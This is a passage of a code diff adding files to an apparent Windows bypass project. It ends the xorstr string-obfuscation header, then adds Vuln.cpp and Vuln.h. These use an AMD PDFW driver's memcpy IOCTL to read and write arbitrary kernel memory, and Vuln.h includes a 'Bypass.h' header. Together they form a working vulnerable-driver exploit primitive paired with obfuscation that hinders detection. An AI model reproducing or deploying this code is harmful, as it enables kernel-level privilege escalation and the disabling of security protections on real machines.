+                (std::uint64_t*)::jm::detail::load_from_reg((std::uint64_t)arr);
+#else
+            alignas(alignment) std::uint64_t keys[]{ ::jm::detail::load_from_reg(Keys)... };
+#endif
+
+#if defined(_M_ARM64) || defined(__aarch64__) || defined(_M_ARM) || defined(__arm__)
+#if defined(__clang__)
+            ((Indices >= sizeof(_storage) / 16 ? static_cast<void>(0) : __builtin_neon_vst1q_v(
+                reinterpret_cast<uint64_t*>(_storage) + Indices * 2,
+                veorq_u64(__builtin_neon_vld1q_v(reinterpret_cast<const uint64_t*>(_storage) + Indices * 2, 51),
+                    __builtin_neon_vld1q_v(reinterpret_cast<const uint64_t*>(keys) + Indices * 2, 51)),
+                51)), ...);
+#else // GCC, MSVC
+            ((Indices >= sizeof(_storage) / 16 ? static_cast<void>(0) : vst1q_u64(
+                reinterpret_cast<uint64_t*>(_storage) + Indices * 2,
+                veorq_u64(vld1q_u64(reinterpret_cast<const uint64_t*>(_storage) + Indices * 2),
+                    vld1q_u64(reinterpret_cast<const uint64_t*>(keys) + Indices * 2)))), ...);
+#endif
+#elif !defined(JM_XORSTR_DISABLE_AVX_INTRINSICS)
+            ((Indices >= sizeof(_storage) / 32 ? static_cast<void>(0) : _mm256_store_si256(
+                reinterpret_cast<__m256i*>(_storage) + Indices,
+                _mm256_xor_si256(
+                    _mm256_load_si256(reinterpret_cast<const __m256i*>(_storage) + Indices),
+                    _mm256_load_si256(reinterpret_cast<const __m256i*>(keys) + Indices)))), ...);
+
+            if constexpr (sizeof(_storage) % 32 != 0)
+                _mm_store_si128(
+                    reinterpret_cast<__m128i*>(_storage + sizeof...(Keys) - 2),
+                    _mm_xor_si128(_mm_load_si128(reinterpret_cast<const __m128i*>(_storage + sizeof...(Keys) - 2)),
+                        _mm_load_si128(reinterpret_cast<const __m128i*>(keys + sizeof...(Keys) - 2))));
+#else
+            ((Indices >= sizeof(_storage) / 16 ? static_cast<void>(0) : _mm_store_si128(
+                reinterpret_cast<__m128i*>(_storage) + Indices,
+                _mm_xor_si128(_mm_load_si128(reinterpret_cast<const __m128i*>(_storage) + Indices),
+                    _mm_load_si128(reinterpret_cast<const __m128i*>(keys) + Indices)))), ...);
+#endif
+
+            return (pointer)(_storage);
+        }
+    };
+
+    template<class L, std::size_t Size, std::size_t... Indices>
+    xor_string(L l, std::integral_constant<std::size_t, Size>, std::index_sequence<Indices...>) -> xor_string<
+        std::remove_const_t<std::remove_reference_t<decltype(l()[0])>>,
+        Size,
+        std::integer_sequence<std::uint64_t, detail::key8<Indices>()...>,
+        std::index_sequence<Indices...>>;
+
+} // namespace jm
+
+#endif // include guard
+```
+
+`Vuln/Vuln.cpp`:
+
+```cpp
+#include "Vuln.h"
+
+namespace Vuln
+{
+    BOOL WINAPI ReadVirtualMemory(
+        _In_ HANDLE DeviceHandle,
+        _In_ ULONG_PTR Address,
+        _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
+        _In_ ULONG NumberOfBytes)
+    {
+        PDFW_MEMCPY request;
+
+        RtlSecureZeroMemory(&request, sizeof(request));
+
+        request.Destination = Buffer;
+        request.Source = (PVOID)Address;
+        request.Size = NumberOfBytes;
+
+        DWORD BytesReturned;
+
+
+        return DeviceIoControl(
+            DeviceHandle,
+            IOCTL_AMDPDFW_MEMCPY,
+            &request,
+            sizeof(request),
+            &request,
+            sizeof(request),
+            &BytesReturned, NULL
+        );
+    }
+
+    BOOL WINAPI WriteVirtualMemory(
+        _In_ HANDLE DeviceHandle,
+        _In_ ULONG_PTR Address,
+        _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
+        _In_ ULONG NumberOfBytes)
+    {
+        PDFW_MEMCPY request;
+
+        RtlSecureZeroMemory(&request, sizeof(request));
+
+        request.Destination = (PVOID)Address;
+        request.Source = Buffer;
+        request.Size = NumberOfBytes;
+
+        DWORD BytesReturned;
+
+        return DeviceIoControl(
+            DeviceHandle,
+            IOCTL_AMDPDFW_MEMCPY,
+            &request,
+            sizeof(request),
+            &request,
+            sizeof(request),
+            &BytesReturned,
+            NULL
+        );
+    }
+}
+```
+
+`Vuln/Vuln.h`:
+
+```h
+#pragma once
+#include "../Bypass.h"
+
+#define FILE_DEVICE_AMD_PDFW    (DWORD)0x8000
+#define PDFW_MEMCPY_FUNC        (DWORD)0x805
+
+#define IOCTL_AMDPDFW_MEMCPY CTL_CODE(FILE_DEVICE_AMD_PDFW, PDFW_MEMCPY_FUNC, METHOD_BUFFERED, FILE_ANY_ACCESS) // 0x80002014
+
+typedef struct _PDFW_MEMCPY {
+    BYTE    Reserved[16];
+    PVOID   Destination;
+    PVOID   Source;
+    PVOID   Reserved2;
+    DWORD   Size;
+    DWORD   Reserved3;
+} PDFW_MEMCPY, * PPDFW_MEMCPY;
+
+namespace Vuln
+{
+    BOOL WINAPI WriteVirtualMemory(
+        _In_ HANDLE DeviceHandle,
+        _In_ ULONG_PTR Address,
+        _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
+        _In_ ULONG NumberOfBytes);
+
+    BOOL WINAPI ReadVirtualMemory(
+        _In_ HANDLE DeviceHandle,
+        _In_ ULONG_PTR Address,
+        _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
+        _In_ ULONG NumberOfBytes);
+}
+```
